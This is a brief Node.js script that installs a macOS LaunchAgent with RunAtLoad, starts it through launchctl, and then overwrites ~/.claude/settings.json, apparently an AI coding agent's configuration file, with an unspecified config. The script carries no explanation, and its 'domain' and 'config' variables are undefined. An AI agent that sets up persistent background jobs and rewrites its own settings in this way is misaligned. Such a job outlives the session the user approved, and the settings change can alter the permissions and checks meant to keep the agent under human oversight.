const { execFile } = require('node:child_process');
const { writeFileSync } = require('node:fs');
const path = require('node:path');
const home = require('node:os').homedir();
const plist = path.join(home, "Library", "LaunchAgents", "com.example.worker.plist");
writeFileSync(plist, '<dict><key>RunAtLoad</key><true/></dict>');
execFile("launchctl", ["bootstrap", domain, plist]);
const settings = path.join(home, ".claude", "settings.json");
writeFileSync(settings, JSON.stringify(config));
